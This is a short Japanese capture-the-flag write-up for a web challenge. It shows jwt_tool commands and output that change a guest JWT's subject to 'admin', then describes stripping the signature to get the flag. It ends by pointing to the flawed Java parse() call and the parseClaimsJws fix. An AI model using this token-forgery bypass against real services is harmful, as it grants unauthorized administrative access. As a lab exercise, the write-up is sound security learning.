---
title: "jalyboy-baby"
points: 100
tags: ["web"]
---

// TODO 良い感じに書く

`login in guest` ボタンをクリックすると、こんな感じのjwtが手に入る。

- `eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.hwzUMPd20LkyVIieH_92ETWpJSLGnk3l7R03NWfUW-E`

```
$ git clone git@github.com:ticarpi/jwt_tool.git
$ cd jwt_tool
$ docker build . -t jwt_tool
$ docker run -it --entrypoint /bin/sh jwt_tool
# jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.hwzUMPd20LkyVIieH_92ETWpJSLGnk3l7R03NWfUW-E
# python3 jwt_tool.py $jwt -T

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] alg = "HS256"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] sub = "guest"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of sub is: guest
Please enter new value and hit ENTER
> admin
[1] sub = "admin"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_73b80ff3aecc43881aaa3445bc3a7d96 - Tampered token:
[+] eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.hwzUMPd20LkyVIieH_92ETWpJSLGnk3l7R03NWfUW-E
```

subをadminに書き換えて出てきたのがこれ。

- `eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.hwzUMPd20LkyVIieH_92ETWpJSLGnk3l7R03NWfUW-E`

ここから署名を削ったものを投げたらフラグゲット。

こうなっているコードだけど、parseは署名の検証は行わないらしいので、`parseClaimsJws`に変更する必要がある。

```java
Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(j);
Claims claims = (Claims) jwt.getBody();
```